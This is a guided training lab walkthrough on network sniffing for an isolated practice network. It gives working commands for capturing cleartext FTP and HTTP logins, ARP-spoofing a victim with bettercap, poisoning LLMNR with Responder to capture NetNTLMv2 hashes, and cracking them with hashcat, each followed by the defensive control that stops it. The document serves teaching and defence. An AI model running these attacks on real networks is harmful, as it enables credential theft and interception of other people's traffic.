# Module 08 — Sniffing · Guided Lab Walkthrough

> A step-by-step, **do-it-in-order** lab against **your own** environment only (the lab in [`../../labs/`](../../labs/README.md) — see [`../../labs/topology.md`](../../labs/topology.md)). Each step gives the command, what you should observe, a hint, and the defender/PAM takeaway. Outputs shown are **representative** — yours will differ.

> ⚠️ **Own-lab-segment only.** Run everything on the isolated host-only network `192.168.56.0/24`. **ARP poisoning and MAC flooding disrupt real networks** — never run Parts B or C off your lab, on a corporate/home LAN, or on any segment you do not own. There is no route from the lab segment to the internet or your home LAN by design.

**Goal:** prove that L2 sniffing *sees and steals* traffic — then watch **encryption neutralize the payoff** and **switch/host hardening neutralize the technique.**

**Targets:** Kali `192.168.56.10` (attacker) · Metasploitable2 `192.168.56.20` (Linux target, FTP + HTTP login) · Windows DC `192.168.56.30` (`ceh.lab`) · Windows member `ws01 192.168.56.31` (victim) · host-only gateway `192.168.56.1`.

**Prereqs:** lab is up (`labs/scripts/setup.sh`), you can ping the targets, and `rockyou.txt` is unpacked (`/usr/share/wordlists/rockyou.txt`). Confirm your Kali capture interface with `ip -br addr` (shown as `eth0` below — yours may be `eth1`).

---

## Part A — Capture cleartext credentials, then watch TLS defeat it

### A1. Capture your own FTP login and read the password in the clear
Start a capture on Kali, then log in to Metasploitable's FTP in a second terminal.
```bash
# terminal 1 — capture only FTP control traffic (BPF capture filter)
sudo tcpdump -i eth0 -w ftp.pcap 'tcp port 21'

# terminal 2 — log in (msfadmin/msfadmin), then quit
ftp 192.168.56.20
#   Name: msfadmin
#   Password: msfadmin
#   ftp> quit
```
Stop the capture (Ctrl-C in terminal 1) and read it back:
```bash
tshark -r ftp.pcap -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"'
```
**You should see** the credentials in plaintext:
```
USER msfadmin
PASS msfadmin
```
**Observe:** FTP sends `USER` and `PASS` as readable ASCII — anyone on-path (or on a hub/SPAN) reads the password directly. Note `tcp port 21` is a **capture filter (BPF)** while `ftp.request.command == "PASS"` is a **display filter** — two different grammars.

<details><summary>Hint: no packets captured?</summary>Confirm the interface with <code>ip -br addr</code> and that FTP is open: <code>nc -nv 192.168.56.20 21</code>. If tshark shows nothing, drop the display filter and just run <code>tshark -r ftp.pcap</code> to see raw frames, then narrow down.</details>

### A2. Do the same over an HTTP login form
DVWA/Mutillidae is served over **HTTP** on Metasploitable (`http://192.168.56.20/`).
```bash
sudo tcpdump -i eth0 -w http.pcap 'tcp port 80'
# browse to http://192.168.56.20/dvwa/login.php and submit any login, then Ctrl-C
tshark -r http.pcap -Y 'http.request.method == "POST"' -T fields -e http.file_data
```
**You should see** the POSTed form fields, including `username=...&password=...`, in cleartext.

**Observe:** HTTP Basic auth (`http.authbasic`) and form POSTs both expose credentials. The protocol, not the app, is the problem.

### A3. Repeat over TLS/SSH and confirm you only get ciphertext
```bash
sudo tcpdump -i eth0 -w tls.pcap 'tcp port 22'
# in another terminal: sftp msfadmin@192.168.56.20   (or ssh)  then exit
tshark -r tls.pcap -Y 'ssh' | head
```
**You should see** an SSH handshake and then **encrypted** application data — **no readable username or password** anywhere in the bytes.

**Observe:** same attacker position, same capture — but the credential is gone. **Encryption is the swap that makes sniffing worthless.** (Equivalent test: log in over **HTTPS/FTPS** and confirm the payload is TLS ciphertext.)

**Defender/PAM view:** the durable fix is to **disable cleartext protocols** (Telnet/FTP/HTTP/SNMPv1-2c/LDAP) and force SSH/TLS/SNMPv3/LDAPS. For *privileged* logins, go further: broker them through a [PAM proxy (PSM)](../../defender-pam/pam-architecture.md) so the credential is injected **server-side** and never appears on the admin's wire even in encrypted form to crack later.

---

## Part B — ARP MITM with bettercap (victim ↔ gateway)

> Poison **one** victim (`ws01 192.168.56.31`) against the gateway (`192.168.56.1`). Enable forwarding first so the victim stays online.

### B1. Turn on IP forwarding, then ARP-spoof the victim
```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo bettercap -iface eth0
```
Inside the bettercap prompt:
```
set arp.spoof.targets 192.168.56.31
set arp.spoof.fullduplex true
arp.spoof on
net.sniff on
```
**You should see** bettercap announce the spoof and start reporting the victim's flows:
```
[sys.log] [inf] arp.spoof enabling forwarding
[sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
[net.sniff] 192.168.56.31 -> 192.168.56.20:80 [http] GET /...
```
**Observe:** the victim's traffic is now flowing **through Kali**. On `ws01`, `arp -a` shows the gateway's IP mapped to **Kali's MAC** — the tell-tale of a poisoned cache. Because forwarding is on, the victim never loses connectivity.

<details><summary>Hint: victim loses its connection?</summary>You forgot IP forwarding — re-run <code>sudo sysctl -w net.ipv4.ip_forward=1</code> before <code>arp.spoof on</code>. Also set <code>arp.spoof.fullduplex true</code> so both the victim and the gateway are poisoned.</details>

### B2. See cleartext vs. TLS from the victim's traffic
With `net.sniff on`, have the victim browse the **HTTP** app on `.20` — you'll see the URLs and any form posts. Then have the victim hit an **HTTPS** page.

**You should see** readable HTTP requests, but for HTTPS only a TLS handshake — and if you attempt to intercept TLS, the victim gets a **certificate warning**.

**Observe:** MITM at L2 succeeds regardless, but **TLS keeps the payload unreadable.** The technique worked; the payoff didn't.

**Defender/PAM view:** the technique itself is killed by **Dynamic ARP Inspection (DAI)** + static ARP for gateways; the *payoff* is killed by encryption. Detection: duplicate-IP / changed-MAC alerts and gratuitous-ARP bursts — see [detection-engineering.md](../../defender-pam/detection-engineering.md). Stop bettercap with `arp.spoof off` then `q` (it restores the caches).

### B3. Apply the control and watch the attack fail
Pin a **static ARP** entry for the gateway on the victim (simulating DAI), then re-run B1:
```powershell
# on ws01 (elevated) — simulate DAI by pinning the gateway MAC
netsh interface ipv4 add neighbors "Ethernet" 192.168.56.1 <REAL-GW-MAC>
```
**You should see** the victim ignore the forged replies — its ARP cache keeps the **real** gateway MAC, and bettercap's flows for that victim dry up.

**You just demonstrated the control.** The attack still *runs* but no longer redirects the victim.

---

## Part C — Responder → NetNTLMv2 → hashcat -m 5600

### C1. Start Responder and trigger a name lookup
```bash
sudo responder -I eth0 -wv
```
On the victim `ws01`, trigger an LLMNR/NBT-NS lookup for a name that won't resolve in DNS (e.g. browse to `\\fileserv01` in Explorer, or `dir \\fileserv01\share`).

**You should see** Responder answer the poisoned lookup and capture a hash:
```
[LLMNR]  Poisoned answer sent to 192.168.56.31 for name fileserv01
[SMB] NTLMv2-SSP Hash : ceh\jdoe::CEH:1122...:A1B2...:0101...
[SMB] NTLMv2-SSP saved to /usr/share/responder/logs/SMB-NTLMv2-...txt
```
**Observe:** you captured a **NetNTLMv2** challenge/response for `jdoe` **without touching the DC** — the victim volunteered it by trusting Responder's forged name answer.

<details><summary>Hint: no hash?</summary>The victim must actually attempt an SMB/name lookup that fails DNS. Confirm LLMNR/NBT-NS is enabled on <code>ws01</code> (it is, until you disable it in C2). Check Responder's <code>logs/</code> directory for saved hashes.</details>

### C2. Crack the hash offline
```bash
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt
```
**You should see** the NetNTLMv2 hash cracked if the password is weak:
```
JDOE::CEH:...:...:...:Summer2024!
Status...........: Cracked
```
**Observe:** mode **5600** is specific to NetNTLMv2 (not `-m 1000` NTLM, not `-m 13100` Kerberos). Offline cracking is silent on the target.

### C3. Apply the control and watch the capture fail
Disable LLMNR/NBT-NS on `ws01` (simulate GPO), then re-trigger the lookup with Responder running:
```powershell
# on ws01 (elevated) — turn off LLMNR
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" `
  -Name EnableMulticast -Value 0 -PropertyType DWord -Force
```
**You should see** Responder get **no poisoned answer** for the failed lookup — the victim no longer broadcasts LLMNR, so there's nothing to hijack.

**Defender/PAM view:** disable **LLMNR + NBT-NS**, enforce **SMB signing**, and require **MFA** so a captured NetNTLMv2 has no reusable payoff. Broker every privileged session so a Responder capture never resolves to a usable privileged credential — see [cyberark-attack-mapping.md](../../defender-pam/cyberark-attack-mapping.md).

---

## What you should conclude
Every "win" above has a specific control that turns it into a logged, contained "loss":

| You did | The control that stops it |
|---|---|
| Sniff FTP/HTTP credentials in cleartext | Encrypt the transport (SSH/TLS/SNMPv3/LDAPS); broker privileged sessions via PAM |
| ARP-poison `ws01` ↔ gateway (MITM) | Dynamic ARP Inspection (DAI) + static ARP for gateways |
| Read a victim's HTTPS payload | You can't — TLS encryption neutralizes the payoff |
| Capture NetNTLMv2 with Responder | Disable LLMNR/NBT-NS, SMB signing, MFA |
| MAC-flood the switch (if attempted) | Port security (limit MACs/port, sticky-MAC) |

## Cleanup
```bash
# stop bettercap: at its prompt run  arp.spoof off  then  q   (restores ARP caches)
# stop Responder: Ctrl-C
sudo sysctl -w net.ipv4.ip_forward=0        # turn forwarding back off
rm -f ftp.pcap http.pcap tls.pcap           # remove captures containing lab creds
# on ws01: remove the static ARP entry and re-enable LLMNR only if you want to repeat from the vulnerable state
```

## Record it
Log commands, filters used, and what surprised you in the **My lab log** table at the bottom of [README.md](README.md), and note any misses in [PROGRESS.md](../../PROGRESS.md).
